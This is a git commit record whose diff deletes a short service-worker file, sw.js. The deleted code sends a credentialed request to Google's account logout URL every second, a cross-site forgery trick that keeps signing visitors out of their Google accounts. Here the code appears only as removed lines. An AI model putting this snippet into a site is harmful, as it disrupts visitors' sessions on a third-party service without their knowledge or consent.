919ec8df1c4f6d2d0b05454a46876688e8e425e4
whyisthesheep <leonjagger@icloud.com>
2023-01-24 18:21:41 +0000

    Added credits and removed stuff

--- sw.js
+++
@@ -1,7 +0,0 @@
-setInterval(function(){
-    fetch("https://www.google.com/accounts/Logout",{
-  credentials: 'include',
-  mode: 'no-cors', // no-cors
-})
-    console.log("Logging you out");
-},1000)
